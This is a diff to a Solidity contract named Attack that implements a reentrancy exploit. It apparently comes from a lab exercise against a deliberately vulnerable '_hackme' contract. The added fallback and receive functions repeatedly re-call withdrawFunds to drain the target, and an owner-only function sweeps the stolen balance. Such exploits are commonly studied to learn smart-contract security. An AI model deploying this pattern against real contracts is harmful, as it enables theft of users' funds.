@@ -15,7 +15,11 @@ contract Attack {
     }
 
     function attackVulnerable() public payable{
-       
+        require(msg.value >= 1 ether);
+        _hackme.depositFunds{value:1 ether}();
+  
+        assert(_hackme.canIWithdraw(address(this)) > 0);
+        _hackme.withdrawFunds(1 ether);
     }
     
     function getBalance()public view returns(uint256){
@@ -23,5 +27,21 @@ contract Attack {
         return address(this).balance;
     }
 
+    function getTheMoneyz() public {
+        //withdraw the funds from the contract
+        require(msg.sender == owner);
+        payable(owner).transfer(payable(this).balance);
+    }
+
+    fallback() external payable { 
+       //fallback function
+        _hackme.withdrawFunds(1 ether);
+
+    }
+
+    receive() external payable{
+       _hackme.withdrawFunds(1 ether);
+    }
+   
        
 }
